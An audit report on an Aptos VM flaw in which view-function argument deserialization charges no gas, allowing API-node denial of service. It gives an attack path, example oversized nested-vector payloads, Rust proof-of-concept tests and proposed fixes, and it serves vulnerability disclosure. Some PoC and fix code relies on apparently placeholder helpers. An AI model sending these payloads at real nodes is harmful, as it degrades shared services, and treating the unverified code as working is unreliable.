# Audit Report

## Title
Gas Limit Bypass in View Function Argument Deserialization Leading to API Node DoS

## Summary
The `construct_args()` function does not charge gas during BCS argument deserialization, allowing attackers to cause excessive CPU consumption on API nodes by providing complex, deeply nested arguments to view functions. When eager loading is enabled, an `UnmeteredGasMeter` is used, completely bypassing gas limits during argument construction.

## Finding Description

The vulnerability exists in the view function argument validation and construction flow. When `validate_view_function()` is called, it invokes `construct_args()` to deserialize and validate function arguments. However, the BCS parsing loop in `recursively_construct_arg()` performs potentially expensive iteration without charging any gas. [1](#0-0) 

When lazy loading is disabled, the code explicitly uses `UnmeteredGasMeter`, completely bypassing gas metering during argument construction. Even when lazy loading is enabled and a metered gas meter is passed: [2](#0-1) 

The actual deserialization loop in `recursively_construct_arg()` never charges gas for its iterations: [3](#0-2) 

The code even acknowledges this issue with a TODO comment: [4](#0-3) 

Gas is only charged when constructor functions are loaded and executed: [5](#0-4) 

**Attack Path:**

1. Attacker crafts a view function call with deeply nested vector arguments (e.g., `vector<vector<vector<u8>>>`) or large vectors of primitive types (e.g., `vector<u64>` with 125,000 elements = 1MB)
2. API node receives the request and calls `execute_view_function()`
3. The request enters `validate_view_function()` which calls `construct_args()`
4. For eager loading: `UnmeteredGasMeter` is used, no gas charged at all
5. For lazy loading: parsing loop iterates thousands/millions of times without gas charges
6. Each iteration performs CPU-intensive operations: cursor reads, recursive function calls, memory allocations
7. Only after full deserialization does constructor execution begin (which charges gas)
8. Attacker repeats with multiple concurrent requests

The only protection is `MAX_NUM_BYTES = 1,000,000` which limits total accumulated bytes to 1MB, but this doesn't limit the number of loop iterations or computational complexity: [6](#0-5) 

## Impact Explanation

This is a **High Severity** vulnerability according to Aptos bug bounty criteria, specifically "Validator node slowdowns" and "API crashes."

**Impact Details:**
- **API Node DoS**: Attackers can overwhelm API nodes with computationally expensive requests that consume CPU cycles without corresponding gas charges
- **Resource Exhaustion**: Multiple concurrent malicious requests can exhaust server resources
- **Service Degradation**: Legitimate view function requests experience degraded performance
- **Complete Gas Bypass (Eager Loading)**: When lazy loading is disabled, the entire argument construction process is unmetered

**Affected Components:**
- All API nodes serving view function requests
- Any view function with vector or struct arguments
- Both public and private API endpoints

This breaks the critical invariant: **"Resource Limits: All operations must respect gas, storage, and computational limits"** as the parsing work is unbounded by gas constraints.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is easily exploitable:
- **No Authentication Required**: Any user can call view functions via public API
- **Simple Exploit**: Only requires crafting BCS-encoded arguments with nested structures
- **Low Complexity**: Attack can be automated and distributed
- **Observable Impact**: Can measure API response times to optimize attack payload
- **No Special Permissions**: Works without validator access or on-chain state modifications

Example attack payloads:
- `vector<u8>` with 1,000,000 elements (1MB of bytes)
- `vector<u64>` with 125,000 elements (1MB total)
- `vector<vector<u8>>` with 1000 outer Ã— 1000 inner elements
- Deeply nested structures up to recursion limits

## Recommendation

Implement proper gas metering in the argument deserialization path:

1. **Charge gas for each iteration** in `recursively_construct_arg()`:
   - Charge base gas per loop iteration
   - Charge gas proportional to bytes read
   - Charge gas for recursive function calls

2. **Remove UnmeteredGasMeter usage** for view functions:
   - Always use metered gas meter regardless of lazy loading configuration
   - Set appropriate gas limits for view function argument construction

3. **Add iteration count limits**:
   - Implement `max_vector_elements` parameter alongside existing `MAX_NUM_BYTES`
   - Limit total iteration count across all nested structures

4. **Enforce gas checks during parsing**:
   - Check gas meter balance periodically during deserialization
   - Fail fast if gas limit is exceeded

**Proposed Fix:**

```rust
// In recursively_construct_arg, before the while loop:
match ty {
    Vector(inner) => {
        let mut len = get_len(cursor)?;
        serialize_uleb128(len, arg);
        while len > 0 {
            // CHARGE GAS FOR EACH ITERATION
            gas_meter.charge_simple_instr(NumBytesLoaded(inner.size_in_bytes()))?;
            
            recursively_construct_arg(...)?;
            len -= 1;
        }
    },
    // ... rest of match
}
```

And remove the UnmeteredGasMeter fallback:

```rust
// In validate_view_function, remove the else branch:
let result = transaction_arg_validation::construct_args(
    session,
    loader,
    gas_meter,  // Always use the metered gas_meter
    traversal_context,
    func.param_tys(),
    args,
    func.ty_args(),
    allowed_structs,
    true,
);
```

## Proof of Concept

```rust
#[test]
fn test_view_function_gas_bypass_with_large_vector() {
    // Setup: Create a Move module with a view function accepting vector<u8>
    let mut state = setup_test_state();
    
    // Craft malicious argument: vector<u8> with 1,000,000 elements
    let mut malicious_arg = vec![];
    // Write ULEB128 length = 1,000,000
    serialize_uleb128(&mut malicious_arg, 1_000_000_u64);
    // Append 1,000,000 bytes (will hit MAX_NUM_BYTES limit but still causes work)
    malicious_arg.extend(vec![0u8; 1_000_000]);
    
    let start = Instant::now();
    
    // Execute view function
    let result = AptosVM::execute_view_function(
        &state,
        module_id!("0x1::test"),
        ident!("process_vector"),
        vec![],
        vec![malicious_arg],
        1_000_000, // max gas
    );
    
    let elapsed = start.elapsed();
    
    // Assertion: Processing takes significant time but reports low gas usage
    assert!(elapsed > Duration::from_millis(100)); // Significant CPU time spent
    assert!(result.gas_used < 10_000); // But minimal gas charged
    
    println!("Time elapsed: {:?}, Gas charged: {}", elapsed, result.gas_used);
    // Demonstrates gas bypass: CPU time >> gas charged
}

#[test]
fn test_nested_vector_dos_attack() {
    let mut state = setup_test_state();
    
    // Craft deeply nested vector<vector<u8>>
    // Outer vector: 1000 elements
    // Each inner vector: 1000 elements
    // Total iterations: 1,000 + 1,000,000 = 1,001,000 without gas charges
    let mut malicious_arg = vec![];
    serialize_uleb128(&mut malicious_arg, 1000_u64); // outer length
    for _ in 0..1000 {
        serialize_uleb128(&mut malicious_arg, 1000_u64); // inner length
        malicious_arg.extend(vec![0u8; 1000]); // inner data
    }
    
    let start = Instant::now();
    let result = AptosVM::execute_view_function(
        &state,
        module_id!("0x1::test"),
        ident!("process_nested_vector"),
        vec![],
        vec![malicious_arg],
        1_000_000,
    );
    let elapsed = start.elapsed();
    
    assert!(elapsed > Duration::from_millis(500)); // Very slow
    assert!(result.gas_used < 50_000); // But minimal gas
}
```

**Notes:**
- This vulnerability affects all view function calls with vector or struct arguments
- The `max_invocations = 10` limit only restricts constructor calls, not vector element iterations
- The API layer's `MAX_RECURSIVE_TYPES_ALLOWED = 8` only limits type nesting depth during API deserialization, not argument value complexity
- Attack works even with legitimate view functions from trusted contracts

### Citations

**File:** aptos-move/aptos-vm/src/verifier/view_function.rs (L64-75)
```rust
    let result = if loader.is_lazy_loading_enabled() {
        transaction_arg_validation::construct_args(
            session,
            loader,
            gas_meter,
            traversal_context,
            func.param_tys(),
            args,
            func.ty_args(),
            allowed_structs,
            true,
        )
```

**File:** aptos-move/aptos-vm/src/verifier/view_function.rs (L76-89)
```rust
    } else {
        let traversal_storage = TraversalStorage::new();
        transaction_arg_validation::construct_args(
            session,
            loader,
            // No metering with eager loading.
            &mut UnmeteredGasMeter,
            &mut TraversalContext::new(&traversal_storage),
            func.param_tys(),
            args,
            func.ty_args(),
            allowed_structs,
            true,
        )
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L242-242)
```rust
    // Perhaps in a future we should do proper gas metering here
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L345-363)
```rust
        Vector(inner) => {
            // get the vector length and iterate over each element
            let mut len = get_len(cursor)?;
            serialize_uleb128(len, arg);
            while len > 0 {
                recursively_construct_arg(
                    session,
                    loader,
                    gas_meter,
                    traversal_context,
                    inner,
                    allowed_structs,
                    cursor,
                    initial_cursor_len,
                    max_invocations,
                    arg,
                )?;
                len -= 1;
            }
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L473-511)
```rust
    let function = load_constructor_function(
        loader,
        gas_meter,
        traversal_context,
        &constructor.module_id,
        constructor.func_name,
        expected_type,
    )?;
    let mut args = vec![];
    let ty_builder = &loader.runtime_environment().vm_config().ty_builder;
    for param_ty in function.param_tys() {
        let mut arg = vec![];
        let arg_ty = ty_builder
            .create_ty_with_subst(param_ty, function.ty_args())
            .unwrap();

        recursively_construct_arg(
            session,
            loader,
            gas_meter,
            traversal_context,
            &arg_ty,
            allowed_structs,
            cursor,
            initial_cursor_len,
            max_invocations,
            &mut arg,
        )?;
        args.push(arg);
    }
    let serialized_result = session.execute_loaded_function(
        function,
        args,
        gas_meter,
        traversal_context,
        loader,
        // No need to record the trace for argument construction.
        &mut NoOpTraceRecorder,
    )?;
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L557-562)
```rust
    const MAX_NUM_BYTES: usize = 1_000_000;
    if len.checked_add(n).is_none_or(|s| s > MAX_NUM_BYTES) {
        return Err(deserialization_error(&format!(
            "Couldn't read bytes: maximum limit of {} bytes exceeded",
            MAX_NUM_BYTES
        )));
```
